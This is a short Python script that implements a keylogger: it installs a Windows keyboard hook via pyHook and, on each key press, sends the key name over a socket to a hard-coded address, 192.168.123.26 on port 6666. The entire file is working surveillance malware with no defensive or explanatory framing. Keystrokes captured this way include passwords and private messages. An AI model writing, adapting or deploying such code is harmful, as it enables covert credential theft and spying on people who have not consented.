import pythoncom
import pyHook
from socket_client_pickle import client_pic


def onKeyboardEvent(event):
    dict_key = {}
    dict_key['Key'] = event.Key

    client_pic('192.168.123.26', 6666, dict_key)
    return True


def keylogger():
    hm = pyHook.HookManager()
    hm.keyDown = onKeyboardEvent
    hm.HookKeyboard()
    pythoncom.PumpMessages()


if __name__ == '__main__':
    keylogger()
